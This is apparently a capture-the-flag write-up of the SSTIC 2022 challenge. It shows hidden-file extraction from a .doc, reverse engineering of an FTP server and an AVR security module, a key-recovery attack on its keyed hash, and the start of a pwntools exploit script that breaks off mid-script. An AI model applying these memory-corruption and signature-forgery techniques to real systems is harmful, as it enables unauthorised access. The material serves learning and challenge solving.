Author: Robert Xiao (@nneonneo)

## Table of Contents

- [Introduction](#introduction)
- [Tools Used](#tools-used)
- [Stage 1](#stage-1)
- [The Release Package](#the-release-package)
  - [Analysis](#analysis)
- [Stage 2](#stage-2)
  - [Commands](#commands)
  - [Bugs](#bugs)
  - [Reversing the HSM](#reversing-the-hsm)
  - [Cryptanalysis](#cryptanalysis)
  - [Forging Signatures](#forging-signatures)
- [Stage 3](#stage-3)
- [Stage 4](#stage-4)
  - [Reversing zz](#reversing-zz)
    - [The 32-bit Surprise](#the-32-bit-surprise)
  - [The Decompressor](#the-decompressor)
- [Stage 5](#stage-5)
  - [Running Code in the FTP Server](#running-code-in-the-ftp-server)
  - [The GoodFS Filesystem](#the-goodfs-filesystem)
  - [Corrupting GoodFS](#corrupting-goodfs)
- [Stage 6](#stage-6)
  - [Exploiting mounter_server via Negative Inodes](#exploiting-mounter_server-via-negative-inodes)
- [Final Stage](#final-stage)
- [Solution Summary](#solution-summary)
- [Timeline](#timeline)
  - [Friday April 1](#friday-april-1)
  - [Saturday April 2](#saturday-april-2)
  - [Sunday April 3](#sunday-april-3)
  - [Friday April 8](#friday-april-8)
- [Conclusion](#conclusion)


## Introduction

I participated again in the [SSTIC challenge this year](https://www.sstic.org/2022/challenge/), and had a blast. This year's challenge consisted of six stages with individual flags, with the final stage providing an email address that had to be emailed to complete the challenge. The stages involved a diverse set of skills: file format forensics, reverse engineering (AVR assembly and 32/64-bit Intel Linux binaries), binary exploitation (and a lot of shellcoding), and cryptography (breaking a keyed hash function).

My timeline of the stages runs as follows (all times in my timezone, GMT-7); a fuller accounting of time is given in the [Timeline](#timeline) section.

- Fri Apr 1, 10:21 am: Start the challenge.
- Fri Apr 1, 10:51 am (+30 minutes): Complete stage 1.
- Sat Apr 2, 3:27 pm (+25 hours): Complete stage 2.
- Sat Apr 2, 5:54 pm (+2.5 hours): Complete stage 3.
- Sun Apr 3, 3:15 am (+9.5 hours): Complete stage 4.
- Sun Apr 3, 3:37 pm (+12 hours): Complete stage 5.
- Fri Apr 8, 11:00 am (+5 days): Hint for stage 6 released.
- Fri Apr 8, 8:06 pm (+9 hours): Complete stage 6.
- Fri Apr 8, 8:26 pm (+20 minutes): Send email to complete the challenge.

The challenge was presented in French this year. However, most of the challenge is language-agnostic; only the challenge flavourtext was in French, and English translations will be provided in this writeup.

The release of the challenge included this announcement:

```
We have intercepted a hidden message from the Organization. We assume they are
responsible for many misdeeds, but we have never been able to gather enough
evidence to be taken seriously.

Fortunately, we are about to reveal their secrets. One of our sources discovered
that they were exchanging information camouflaged in files on forums. Our source
was able to identify a secret document on a cooking forum but couldn't tell us
more without compromising his position.

Unfortunately, none of our experts managed to extract the sensitive information
hidden in it.

Your mission, if you accept it, is to recover the contents of this secret file,
and to discover as much as possible about the Organization in order to expose
their activities.
```

## Tools Used

Here, I list all of the tools that I used throughout the challenge.

- Computer: 2019 MacBook Pro, macOS 12.3.1
- Text editor: BBEdit
- VMWare Fusion 11, with an Ubuntu 20.04 VM:
    - gdb 11.2, with a [custom patch](https://wiki.osdev.org/QEMU_and_GDB_in_long_mode#Workaround_2:_Patching_GDB) to support arch switching when debugging QEMU
    - QEMU (running in a Docker container)
    - binwalk (running in a Docker container)
- IDA Pro 7.6
- [Ghidra 10.1.2](https://ghidra-sre.org/)
- Binary Ninja's [Shellcode Compiler](https://scc.binary.ninja/)
- Python 3.8
    - [pwntools](https://github.com/Gallopsled/pwntools)
    - [Hachoir](https://github.com/vstinner/hachoir)
    - [Capstone](https://www.capstone-engine.org/)
- [SageMath 9.0](https://www.sagemath.org/)
- [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)

## Stage 1

The initial announcement of the challenge included a 5.8 MB file called [`Recette.doc`](chall/Recette.doc), which was ostensibly a Word document containing a recipe for an apple pie. I did not bother to open this file. Instead, I opened the file in [Hachoir](https://github.com/vstinner/hachoir), a versatile parser for many different file formats. I use Hachoir to explore file formats, discover hidden data and analyze the structure of files.

![`Recette.doc` viewed in Hachoir, showing a lot of unparsed chunks](images/stage1-001-hachoir.png)

Opening the file in Hachoir, the first noticeable feature is that large amounts of the file are "unparsed". Hachoir is driven by Python scripts which parse the structure of the file and assign meaning to each bit and byte in the file. The stated goal is to be able to explain every bit of a file. However, when files contain hidden data that is not referred to by the format itself, then these blocks will end up being "unparsed". Often, a normal file will contain small amounts of "unparsed" data as padding and so forth, but this file contains several MB worth of unparsed data.

The unparsed data did not have an obvious structure, so on a lark, I decided to use [Binwalk](https://github.com/ReFirmLabs/binwalk) to look for recognizable signatures in the file. This yielded one result:

```
stage1$ docker run -it --rm -v "$(pwd):/binwalk" rjocoleman/binwalk ./Recette.doc

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1991168       0x1E6200        gzip compressed data, from Unix, last modified: 1970-01-01 00:00:00 (null date)
```

Indeed, according to Hachoir, this offset lies inside one of the unparsed blocks, suggesting that there is a gzip hidden inside. However, just attempting to extract the file starting at this offset fails.

Old-style `.doc` files are in the OLE format, which is akin to a miniature filesystem: the file is divided into blocks of (typically) 512 bytes, which are organized using a FAT scheme. Sub files ("properties"), which can contain things like embedded objects (e.g. images), document metadata, formatting, content, etc., are stored in this filesystem as sequences of blocks. The FAT scheme uses a File Allocation Table (FAT) to store the mapping from files to blocks in a linked list: files are identified by their initial block number, and subsequent file blocks are fetched by following block pointers stored in the FAT.

Under the assumption that the hidden file was stored in the FAT to make it recoverable, but was not referred to by any properties, I wrote a quick script ([`parse.py`](files/stage1/parse.py)) which used the Hachoir API to walk the FAT table:

```python
from hachoir.parser.misc.ole2 import OLE2_File
from hachoir.stream import FileInputStream

p = OLE2_File(FileInputStream("Recette.doc"))
blocksize = 512
fat = []
for bb in p.array("bbfat"):
    for fld in bb:
        fat.append(fld.value)

# offset from binwalk (+/- 1 to account for 512-byte file header)
start = (0x1E6200 // 512) - 1
chain = [start]
while 1:
    start = fat[start]
    if start > 0xfffffff0:
        break
    chain.append(start)

with open("Recette.doc", "rb") as inf, open("hidden.gz", "wb") as outf:
    for entry in chain:
        inf.seek((entry + 1) * 512)
        outf.write(inf.read(512))
```

This spit out a valid `.gz` file which turned out to be a `tar.gz` archive, saved as [`hidden.tgz`](files/stage1/hidden.tgz). Extracting this file with `tar xzf` produced a bunch of files. One of these files, [`e4r7h.txt`](chall/release/e4r7h.txt), contained the following (translated):

```
This secret archive contains the "SEUKRAI" project, a file upload system that I designed.

This is an FTP server, which will eventually have the following capabilities:

    - Anonymous file storage
    - Custom data compression
    - All hosted on a custom file system

At the moment, only the FTP server is fully operational, other features are under test, you can access my test instance on
62.210.131.87 to take a look.

The "anon" user has free access to public folders, but this is only a facade: Once all the features are implemented, it will
be possible to connect via a secret user, in order to access highly classified data of our organization.

This system is extremely secure, and its entirely homemade implementation will allow our operations to remain secret.

You can mount your own instance of the server for testing purposes. Eventually, this will be your primary means of
communication with other members of the organization.

I will keep you posted on the finalization of development in the coming weeks.


Cordially,
Great Guru Skippy

SSTIC{47962828593d98d0d7392590529c4014}
```

And there's our flag for stage 1!

## The Release Package

The [`hidden.tgz`](files/stage1/hidden.tgz) file contained the following in a [`release`](chall/release) directory:

- [`e4r7h.txt`](chall/release/e4r7h.txt): stage 1 flag and information about the release
- [`Makefile`](chall/release/Makefile): instructions for building and running the project
- [`bzImage`](chall/release/bzImage): Linux kernel image
- [`initramfs.img`](chall/release/initramfs.img): Linux initrd filesystem
- [`start_vm.sh`](chall/release/start_vm.sh): A script which boots QEMU with the kernel and initrd
- [`chall.hex`](chall/release/chall.hex): An Intel HEX file containing a program written in AVR assembly and executed using simavr
- [`simavr.patch`](chall/release/simavr.patch): A patch for simavr, applied by the Makefile

In turn, we can use `cpio -iz` to unpack [`initramfs.img`](chall/release/initramfs.img). This yields a Linux filesystem, with the familiar `bin`, `etc`, `lib` directories.

- [`bin`](chall/initramfs/bin), which contains a bunch of symlinks to [`busybox`](chall/initramfs/bin/busybox), as well as the following two binaries:
    - [`bin/mounter_client`](chall/initramfs/bin/mounter_client)
    - [`bin/mounter_server`](chall/initramfs/bin/mounter_server)
- [`devices/sdb`](chall/initramfs/devices/sdb)
- [`etc`](chall/initramfs/etc), containing [`group`](chall/initramfs/etc/group), [`hosts`](chall/initramfs/etc/hosts) and [`passwd`](chall/initramfs/etc/passwd)
- [`home/sstic`](chall/initramfs/home/sstic):
    - [`home/sstic/info.txt`](chall/initramfs/home/sstic/info.txt)
    - [`home/sstic/secret.txt`](chall/initramfs/home/sstic/secret.txt): contains simply `REDACTED`
    - [`home/sstic/server`](chall/initramfs/home/sstic/server)
    - [`home/sstic/sensitive/m00n.txt`](chall/initramfs/home/sstic/sensitive/m00n.txt): contains simply `REDACTED`
    - [`home/sstic/sensitive/zz`](chall/initramfs/home/sstic/sensitive/zz)
- [`goodfs.ko`](chall/initramfs/goodfs.ko)
- [`init`](chall/initramfs/init)
- [`lib/x86_64-linux-gnu`](chall/initramfs/lib/x86_64-linux-gnu), containing the [`libc.so.6`](chall/initramfs/lib/x86_64-linux-gnu/libc.so.6) and [`libseccomp.so.2`](chall/initramfs/lib/x86_64-linux-gnu/libseccomp.so.2) libraries
- [`lib64/ld-linux-x86-64.so.2`](chall/initramfs/lib64/ld-linux-x86-64.so.2)
- [`root/final_secret.txt`](chall/initramfs/root/final_secret.txt): contains simply `REDACTED`

### Analysis

I performed an initial analysis and triage of the files provided, in order to figure out what to look at next, and how everything fit together. There are a lot of interesting files here!

From the stage 1 readme, [`e4r7h.txt`](chall/release/e4r7h.txt), we know there's an FTP server running on 62.210.131.87. Presumably, this server is started by using `make run` using the provided [`Makefile`](chall/release/Makefile). This downloads the open-source [`simavr`](https://github.com/buserror/simavr) project, patches it, builds it, and launches it on the [`chall.hex`](chall/release/chall.hex) file. It then boots up a QEMU VM using [`start_vm.sh`](chall/release/start_vm.sh), which uses the Linux kernel from [`bzImage`](chall/release/bzImage) and initial filesystem from [`initramfs.img`](chall/release/initramfs.img). [`start_vm.sh`](chall/release/start_vm.sh) also forwards two ports: port 31337 to guest port 31500, and port 33344 to guest port 33344.

The emulated Linux VM starts by calling the [`init`](chall/initramfs/init) script. This script does the following tasks:

- sets up initial filesystem permissions
- mounts `/proc`, `/sys`, `/dev`, etc.
- moves [`devices/sdb`](chall/initramfs/devices/sdb) to `/dev/sdb`
- enables security measures like `kptr_restrict`, `dmesg_restrict`, and `perf_event_paranoid`
- loads the [`/goodfs.ko`](chall/initramfs/goodfs.ko) kernel module
- creates a mount point `/mnt/goodfs`
- launches [`/bin/mounter_server`](chall/initramfs/bin/mounter_server) as root and waits for it to create `/run/mount_shm`
- launches [`/home/sstic/server`](chall/initramfs/home/sstic/server) as user `sstic` (uid/gid 1000)
- when `/home/sstic/server` terminates, it powers off the system.

The VM also has a number of other files:

- [`/home/sstic/info.txt`](chall/initramfs/home/sstic/info.txt) contains the following (translated):

    ```
    I installed a hardware security module to secure the FTP server!
    By adding crypto to sign all kinds of data, we have a solid server :)

    TODO: Thinking about getting the crypto verified
    ```

- [`/home/sstic/secret.txt`](chall/initramfs/home/sstic/secret.txt), [`/home/sstic/sensitive/m00n.txt`](chall/initramfs/home/sstic/sensitive/m00n.txt), and [`/root/final_secret.txt`](chall/initramfs/root/final_secret.txt) contain simply `REDACTED`, suggesting that they need to be retrieved from the remote server to solve various stages of the challenge.
- The binary [`/home/sstic/sensitive/zz`](chall/initramfs/home/sstic/sensitive/zz) is a Linux x86-64 binary which does not seem to be referenced by anything in the ramdisk.
- [`/dev/sdb`](chall/initramfs/devices/sdb) is about 1 MB in size, but it's mostly zeros.
- [`etc`](chall/initramfs/etc) isn't too interesting: it simply discloses the existence of user/group `sstic` (with uid/gid 1000).
- The [`libc.so.6`](chall/initramfs/lib/x86_64-linux-gnu/libc.so.6) and [`ld-linux-x86-64.so.2`](chall/initramfs/lib64/ld-linux-x86-64.so.2) binaries match those distributed with Ubuntu Focal glibc, version `2.31-0ubuntu9.7`, so they're completely standard.

## Stage 2

Based on the initial analysis of the files, the first thing to look at is the FTP server service itself, which is apparently implemented by [`/home/sstic/server`](chall/initramfs/home/sstic/server). Indeed, if we connect to `62.210.131.87:31337` using netcat, we get a `220 Welcome` message after several seconds (presumably a delay due to booting up QEMU for each connection).

We can log in to the server using the usual `anonymous` account, and perform a simple interaction to retrieve a file. Note that every use of `PASV` requires us to open a new connection to the server on the designated IP + port combination.

```
220 Welcome
USER anonymous
331 Username ok, need password
PASS foo@example.com
230 Login successful
LIST
503 Passive mode only
PASV
227 Entering passive mode (62,210,131,87,134,55)
LIST
150 Ok
226 Send Ok
PASV
227 Entering passive mode (62,210,131,87,134,55)
RETR info.txt
150 Ok
226 Send ok
PASV
227 Entering passive mode (62,210,131,87,134,55)
RETR secret.txt
550 Permission denied
```

So, we can retrieve [`info.txt`](chall/initramfs/home/sstic/info.txt) (which is identical to the file we already have), but not `secret.txt`. We will have to reverse engineer `server` to figure out how to retrieve the secret.

Popping `server` into Ghidra, we note that it has symbols, which is definitely going to make reversing easier. Execution begins with the `.init_array`, which calls the `setup` function. This function opens and configures the serial device denoted by the `HSM_DEVICE` environment variable, then uses [`libseccomp`](https://github.com/seccomp/libseccomp) to create a system call filter. That filter allows the following system calls:

```
sys_close = 3(0x3)
sys_write = 1(0x1)
sys_fstat = 5(0x5)
sys_read = 0(0x0)
sys_lseek = 8(0x8)
sys_socket = 41(0x29)
sys_setsockopt = 54(0x36)
sys_bind = 49(0x31)
sys_listen = 50(0x32)
sys_accept = 43(0x2b)
sys_dup = 32(0x20)
sys_fcntl = 72(0x48)
sys_getcwd = 79(0x4f)
sys_getsockname = 51(0x33)
sys_openat = 257(0x101)
sys_open = 2(0x2)
sys_getdents64 = 217(0xd9)
sys_stat = 4(0x4)
sys_chdir = 80(0x50)
sys_brk = 12(0xc)
sys_ioctl = 16(0x10)
sys_nanosleep = 35(0x23)
sys_time = 201(0xc9)
sys_mmap = 9(0x9) with prot <= 5
sys_munmap = 11(0xb)
sys_chmod = 90(0x5a)
sys_mkdir = 83(0x53)
sys_utime = 132(0x84)
sys_exit_group = 231(0xe7)
```

Execution then proceeds with `main`. We note that every function, starting with `main`, seems to call `sign_pointer` on the return address using a stack address as a second argument ("context"), and `auth_pointer` before returning from the function, like a [Pointer Authentication (PAC)](https://lwn.net/Articles/718888/) implementation. These functions read and write to the HSM serial port. Even if we have a stack buffer overflow, we would have to break the pointer signing scheme (and leak a stack address) in order to corrupt the return address successfully.

`main` calls `newFTPServer` to allocate a new `FTPServer` object and fill it full of function pointers, every one of which is signed with `sign_pointer` (with NULL for context). Ghidra's "create structure" and "fill in structure" functions were very helpful for quickly putting together the structure definition.

`main` then calls `startFTPServer` via the function pointer table, which accepts one connection from the client, then calls `handleClientFTPServer`. That function repeatedly reads up to 1024 bytes to a buffer inside the `FTPServer`, null-terminates it, and then calls `parseCommandFTPServer` and `handleCommandFTPServer` to process the command.

`parseCommandFTPServer` looks up the command (the first whitespace-delimited word, up to four bytes long) from a table, then gets a username via `getUsernameFTPServer` and logs the request if a certain value is set in the server object. `handleCommandFTPServer` dispatches the command to the various `handle*FTPServer` functions, and enforces the restriction that non-logged-in users can only call `USER`, `PASS`, `QUIT` or `CERT`.

From reversing all the commands, the `FTPServer` structure looks like this:

```c
struct FTPServer {
    int ssock;            // Server socket FD
    int csock;            // Client socket FD (only one client is allowed)
    int dbgfile;          // Debug file (ftp.log) FD, if DBG was called
    PasvConn *pasv;       // PasvConn object, if PASV is called
    char buf[1024];       // buffer read by handleClientFTPServer
    char authtype;        // 0 for User, 1 for Cert
    char *result_message; // the message that is returned to the user after this command
    char result_malloced; // if the result_msg should be freed after sending it
    char dbgenable;       // if DBG was called
    void *creds;          // NULL if not logged in, User* if USER was called, or Cert* if CERT was called
    // function pointers for startFTPServer, handleClientFTPServer, etc.
    funcptr_t start;
    funcptr_t handleClient;
    funcptr_t parseCommand;
    funcptr_t handleCommand;
    funcptr_t getUsername;
    funcptr_t canExecCmd;
    funcptr_t getPerms;
    funcptr_t destructor;
    funcptr_t handleUser;
    funcptr_t handlePass;
    funcptr_t handleType;
    funcptr_t handlePwd;
    funcptr_t handlePasv;
    funcptr_t handlePort;
    funcptr_t handleList;
    funcptr_t handleRetr;
    funcptr_t handleQuit;
    void *unused;
    funcptr_t handleDbg;
    funcptr_t handleFeat;
    funcptr_t handleCert;
};
```

### Commands

- `QUIT`: calls `destructorFTPServer` and exits
- `PWD`: calls `getcwd` and returns this message to the client
- `PORT`: returns the fixed message `503 Passive mode only\n`
- `FEAT`: returns the fixed message `211 Extensions supported:\nDBG\nCERT\n211 End\n`
- `TYPE`: only allows `TYPE I` (binary mode)
- `PASV`: allocates a `PasvConn` object which opens a new passive connection on a predefined port, enabling commands like `LIST` and `RETR`.
- `LIST`: lists the contents of the current directory in long listing mode via the PASV connection. The directory listing looks like this:

    ```
    drwx------     3 1000 1000      120 Apr 06 21:21 .
    drwxrwxr-x     3    0    0       60 Apr 06 21:21 ..
    drwxrwxr-x     2 1000 1000      100 Apr 06 21:21 sensitive
    -rw-rw-r--     1 1000 1000      219 Apr 06 21:21 info.txt
    -r-xr-xr-x     1 1000 1000    41704 Apr 06 21:21 server
    -rw-rw-r--     1 1000 1000      503 Apr 06 21:21 secret.txt
    ```

- `RETR`: retrieves a file by name and sends it via the PASV connection. The filename cannot contain `/` or `..`, and `secret.txt` is only allowed if `(getPermsFTPServer(server) & 2) == 2`.
- `DBG`: enables debug logging to `ftp.log`, which enables logging of commands in `parseCommandFTPServer` and replies in `handleCommandFTPServer`.

Other typical FTP commands like `STOR`, `CWD`, `HELP` and `SITE` are not implemented, which breaks some FTP clients.

The remaining three commands, `USER`, `PASS` and `CERT` are concerned with login. They use these structures:

```c
struct User {
    char authed;        // 1 if PASS called
    uint64_t perms;     // 1 if USER called with anon or anonymous
    char username[16];  // username from USER
    uint64_t user_sig;  // signature computed by `computeSigUser` (`perms` byte + first seven bytes of `username`)
    funcptr_t computeSig;
};

struct Cert {
    char authed;        // 1 if CERT succeeded
    uint64_t perms;     // perms from the cert request
    char *username;     // allocated by CERT
    uint64_t cert_sig;  // signature computed by `computeSigCert` (`perms` byte + first seven bytes of `username`)
    funcptr_t computeSig;
    funcptr_t destructor;
};
```

- `USER`: deallocate `server->creds` if `server->authtype` is 1 (`CERT`), set `server->creds` to a new `User` if it isn't already allocated, copy the username with `strncpy`, set `user->perms` to 1 if the username is `anon` or `anonymous`, and use `computeSigUser` to compute a 64-bit signature over `perms` and the first seven bytes of `username` using the HSM.
- `PASS`: set `user->authed` if the signature on the `User` structure is valid.
- `CERT`: this is a fairly complicated function which decodes a "certificate" presented as a base64-encoded argument. The certificate needs to have a form like `user=USERNAME&perms=PERMS&sig=SIG`, and the signature is validated by using the HSM to sign the certificate data preceding `&sig=`. If the login succeeds, a new `Cert` object is allocated and set as the `server->creds` using the provided username and perms.

### Bugs

There are several bugs in this code which can be chained together to exploit the server.

1. In `handleClientFTPServer`, if exactly 1024 bytes are read, the null-termination will write a zero to `server->buf[1024]`, which overflows into the `authtype` field. If it was set to 1, indicating that `server->creds` points to a `Cert`, this will cause `server->creds` to be interpreted as pointing to a `User` instead, creating a type confusion vulnerability.

    ```c
    sVar2 = read(server->csock,server->buf,0x400);
    local_24 = (int)sVar2;
    server->buf[local_24] = '\0';
    ```

2. In `handleUserFTPServer`, a username that is 16 bytes long will be copied to `user->username` without null termination due to the behaviour of `strncpy`. Since the username can be leaked via debug messages in `parseCommandFTPServer`, this can be used to leak the subsequent `user_sig` and `computeSig` fields - leaking both the signature computed by the HSM as well as a function pointer.

    ```c
    strncpy(user->username,cmd->arg,0x10);
    ```

3. In `handleCertFTPServer`, `b64decode` uses `malloc` to allocate a 512-byte buffer to hold the decoded argument. However, the base64-encoded argument can be up to 1019 bytes long, which decodes into up to 762 output bytes. This introduces a sizable heap overflow, and the use of base64 enables the following heap objects to be overwritten with arbitrary binary data. The overflow occurs before the cert is parsed, so a valid signature is not needed.
4. In `handleCertFTPServer`, the existing `Cert` object is reused if the user is already logged in via `CERT`. However, if the certificate turns out to be invalid, the `cert->username` field is freed without destroying the certificate, leaving a dangling pointer.

Bug 3 gives us a fairly flexible heap corruption primitive, but the use of signed pointers means that we need to forge signatures if we want to gain RIP control. Bug 2 lets us leak signatures and the ASLR base of the executable; specifically, since we can authenticate as both `anon` and `anonymous`, we can obtain the signatures for the byte sequences `\x01anon\x00\x00\x00` and `\x01anonymo`, as well as the signature from the `computeSigUser` function pointer.

### Reversing the HSM

The HSM is implemented as an emulated AVR microprocessor running the [`chall.hex`](chall/release/chall.hex) program. The emulator is the `simduino` program from `simavr`, patched to incorporate an EEPROM attached via the I2C bus. The EEPROM is initialized with a 16-byte key at address 0 (`K1`, `K2` environment variables) and a 32-byte password at address 16 (`GOODFS_PASSWD` environment variable).

We can load `chall.hex` into Ghidra as an Intel HEX program with the processor set to "AVR8 for an Atmega 328P". The decompilation quality isn't great, but luckily AVR assembly is not that hard to read.

The code starts at address 0000 (the Reset vector), which jumps to the Reset handler at 0034. This copies some program data to RAM and calls the "main" function at 044b.

`main` calls 03da to initialize the UART (serial connection to the host computer) and 030e to initialize the TwoWire bus (I2C connection to the EEPROM). It then loops, calling 03f0 to read one byte from the UART, then 022a to handle that byte.

022a supports four commands:

1. `0x01`: `sign_pointer`. Reads two `uint64_t` values from the UART: a 64-bit pointer and a 64-bit context value (set to NULL for function pointers, and to a stack address for return addresses), and writes a signed 64-bit pointer to the UART.
2. `0x02`: `auth_pointer`. Reads two `uint64_t` values: a 64-bit signed pointer and a 64-bit context value, and writes the original 64-bit pointer.
3. `0x03`: `sign_u64`. Reads two `uint64_t` values: a value to sign, and a context value, and writes a 64-bit signature.
4. `0x04`: `get_password`. Reads 32 bytes from the EEPROM starting at address 16, and then writes 32 zeros to the EEPROM at address 16. Writes the data that was read out to the UART.

The pseudocode for the HSM, derived via manually reversing the assembly, looks like this:

```c
byte read_uart_byte() { /* 03f0 */ }
void write_uart_byte(byte b) { /* 03e7 */ }
void read_uart(void *dest, int size) { /* 0425 */ }
void write_uart(void *src, int size) { /* 040b */ }
void i2c_start_tx(byte address) { /* 031f */ }
void i2c_tx_byte(byte b) { /* 0341 */ }
byte i2c_rx_byte() { /* 0352 */ }
void eeprom_write(int addr, void *buf, long size) { /* 035c */ }
void eeprom_read(int addr, void *buf, long size) { /* 0392 */ }
uint64_t u64_xor(uint64_t a, uint64_t b) { /* 023f */ }
/* used to implement comparisons between int64_t and sign-extended chars */
<condflags> i64_cmp(int64_t a, signed char b) { /* 048b */ }
uint64_t u64_shl(int64_t val, byte shift) { /* 0454 */ }
uint64_t u64_shr(int64_t val, byte shift) { /* 046f */ }

void do_sign_pointer() { /* 00de */
    int64_t value;   // Y+0x11
    int64_t context; // Y+0x9
    int64_t output;  // Y+0x1
    read_uart(&value, 8);
    read_uart(&context, 8);
    output = value | (crypt(value, context) & 0xffff0000_00000000);
    write_uart(&output, 8);
}

void do_auth_pointer() { /* 0137 */
    int64_t value;   // Y+0x11
    int64_t context; // Y+0x9
    int64_t output;  // Y+0x1
    read_uart(&value, 8);
    read_uart(&context, 8);
    int64_t tmp = (crypt(value & 0x0000ffff_ffffffff, context) & 0xffff0000_00000000) ^ (value & 0xffff0000_00000000);
    output = value & 0x0000ffff_ffffffff;
    if(tmp != 0) { // i64_cmp
        output |= 0x80000000_00000000;
    }
    write_uart(&output, 8);
}

void do_sign_u64() { /* 019d */
    int64_t value;   // Y+0x11
    int64_t context; // Y+0x9
    int64_t output;  // Y+0x1
    read_uart(&value, 8);
    read_uart(&context, 8);
    output = crypt(value, context);
    write_uart(&output, 8);
}

void do_get_password() { /* 01ec */
    char buf[0x20];
    memset(buf, 0, 0x20);
    eeprom_read(0x10, buf, 0x1f);
    write_uart(buf, 0x20);
    memset(buf, 0, 0x20);
    eeprom_write(0x10, buf, 0x20);
}

int64_t /* R18..R25 */ crypt(int64_t value /* R18..R25 */, int64_t context /* R10..R17 */) { /* 0053 */
    int64_t ctx;   // Y+0x11
    int64_t key1;  // Y+0x9
    int64_t key2;  // Y+0x1
    ctx = context;
    eeprom_read(0x0, &key1, 8);
    eeprom_read(0x8, &key2, 8);
    int64_t result = value; // R18..R25
    result = munge(result, key1);
    result ^= ctx; // u64_xor
    result = munge(result, key1);
    result ^= key2; // u64_xor
    result = munge(result, key1);
    return result;
}

int64_t /* R18..R25 */ munge(int64_t _input /* R18..R25 */, int64_t _key /* R10..R17 */) { /* 0258 */
    int64_t input;   // Zlo, Zhi, Xhi, Y+5, Y+6, R9, R8, R7
    int64_t key;     // R10, R11, R12, R13, R14, R15, R2, R17
    int64_t output;  // R3, R4, R5, R6, Y+1, Y+2, Y+3, Y+4

    input = _input;
    key = _key;
    output = 0;
    while(input != 0 && key != 0) { // 2x i64_cmp
        if((key & 1) != 0) { // i64_cmp
            output ^= input;
        }
        if(input < 0) { // i64_cmp
            input <<= 1; // u64_shl
            input ^= 0x247f43cb7;
        } else {
            input <<= 1; // u64_shl
        }
        key >>= 1; // u64_shr
    }
    return output;
}
```

I reimplemented the entire HSM in Python and verified that its signatures matched those from the real HSM; see [`hsm_test.py`](files/stage2/hsm_test.py).

### Cryptanalysis

The core of the HSM's cryptography is the `crypt` function, which uses a function I called `munge` as a subroutine. The shifting and XORing of the `input` inside `munge` looks very much like the operation of a shift register: the top bit is shifted out, and if it is set, a particular constant is XORed into the register.

Mathematically, we can treat a 64-bit number as a polynomial in GF(2<sup>64</sup>), i.e. as a sequence of 64 binary coefficients, with bit *i* representing the coefficient of *x*<sup>*i*</sup>. Adding two polynomials is implemented as the XOR of the two numbers, since coefficients can only be zero or one. The shift register operation can be viewed as multiplying the input polynomial by *x*, then taking the result *modulo* a particular polynomial *M* = *x<sup>64</sup>* + the polynomial represented by 0x247f43cb7.

The `munge` function is basically multiplying the input polynomial by successive powers of *x*, and then accumulating them into the output if corresponding bits of the key polynomial are set. This is, in fact, simply the multiplication of the `input` polynomial by the `key` polynomial, modulo the modulus *M*. Therefore, the `crypt` function is really just computing the polynomial (((*vk<sub>1</sub>*)+*c*)*k<sub>1</sub>*+*k<sub>2</sub>*)*k<sub>1</sub>*.

We can leak two message-signature pairs (*m<sub>1</sub>*, *s<sub>1</sub>*) and (*m<sub>2</sub>*, *s<sub>2</sub>*) via bug number 2, where *m<sub>1</sub>* is `\x01anon\x00\x00\x00` and *m<sub>2</sub>* is `\x01anonymo`. Both of these are signed with a context value of zero, so the *c* term drops out of the equation, and we have

- (*m<sub>1</sub>k<sub>1</sub>k<sub>1</sub>*+*k<sub>2</sub>*)*k<sub>1</sub>* = *s<sub>1</sub>*
- (*m<sub>2</sub>k<sub>1</sub>k<sub>1</sub>*+*k<sub>2</sub>*)*k<sub>1</sub>* = *s<sub>2</sub>*

Subtracting these equations yields

- (*m<sub>1</sub> - m<sub>2</sub>*)*k<sub>1</sub>k<sub>1</sub>k<sub>1</sub>* = (*s<sub>1</sub>* - *s<sub>2</sub>*)

and therefore, we can obtain the cube of *k<sub>1</sub>* from (*s<sub>1</sub>* - *s<sub>2</sub>*)/(*m<sub>1</sub> - m<sub>2</sub>*) (using polynomial division mod *M*). If we can obtain the cube root of this polynomial, we can then recover the second key *k<sub>2</sub>* by computing (*s<sub>1</sub>* - *m<sub>1</sub>k<sub>1</sub>k<sub>1</sub>k<sub>1</sub>*) / *k<sub>1</sub>*.

SageMath provides a routine to obtain the cube roots of polynomials in GF(2<sup>64</sup>); there are usually three such roots, so we can simply bruteforce the correct root by signing certs with each of the three possible keys and seeing which one is accepted by the server. My key-recovery script ([`hsm_solve.sage`](files/stage2/hsm_solve.sage)) looks like this:

```python
import sys
import random

modulus = x^64
n = 0x247f43cb7
for i in range(64):
    if n & (1 << i):
        modulus += x ^ i

K.<a> = GF(2^64, modulus=modulus)

msg1, sig1, msg2, sig2 = [K.fetch_int(int(c)) for c in sys.argv[1:]]
k1_3 = (sig1 - sig2) / (msg1 - msg2)
k1k2 = sig1 - msg1 * k1_3
assert k1k2 == sig2 - msg2 * k1_3

k1s = k1_3.nth_root(3, all=True)
for k1 in k1s:
    k2 = k1k2 / k1
    print(k1.integer_representation(), k2.integer_representation())
```

### Forging Signatures

Finally, with the cryptanalysis completed, we can leak the signatures from the server and solve for the keys, after which we will be able to forge our own signatures, set our `perms` to whatever we want, and read `secret.txt`. The exploit is a fairly straightforward affair: we enable debug mode, log in a few times with different usernames (including usernames that are 16 characters long), and pull the log file to get our leaks. This is implemented in [`exploit2.py`](files/stage2/exploit2.py):

```python
from pwn import *
import base64
import re
from hsm_test import crypt
import subprocess

context.update(arch="amd64")

s = remote('62.210.131.87', 31337)

banner = s.recvline()
log.info("* %s", banner.rstrip(b"\n").decode())

def send_cmd(cmd, msg="", reply=True):
    if isinstance(cmd, str):
        cmd = cmd.encode()
    if isinstance(msg, str):
        msg = msg.encode()
    s.sendline(cmd + b" " + msg)
    if reply:
        resp = s.recvline().rstrip(b"\n").decode()
        log.info("%s => %s", cmd.decode(), resp)
        return resp

def pasv_cmd(cmd, msg=""):
    resp = send_cmd("PASV")
    addr = resp.split("(")[1].split(")")[0].split(",")
    host = ".".join(addr[:4])
    port = int(addr[4]) * 256 + int(addr[5])
    conn2 = remote(host, port)

    if isinstance(cmd, str):
        cmd = cmd.encode()
    resp = send_cmd(cmd, msg)
    if resp == "150 Ok":
        data = conn2.recvall()
    resp = s.recvline().rstrip(b"\n").decode()
    log.info("%s => %s", cmd.decode(), resp)

    return data

PAC_MASK = 0xffff0000_00000000

# Leak data from User struct
send_cmd("USER", "anon")
send_cmd("PASS", "xxxx")
send_cmd("DBG")
send_cmd("USER", "AAAABBBBCCCCDDDD")
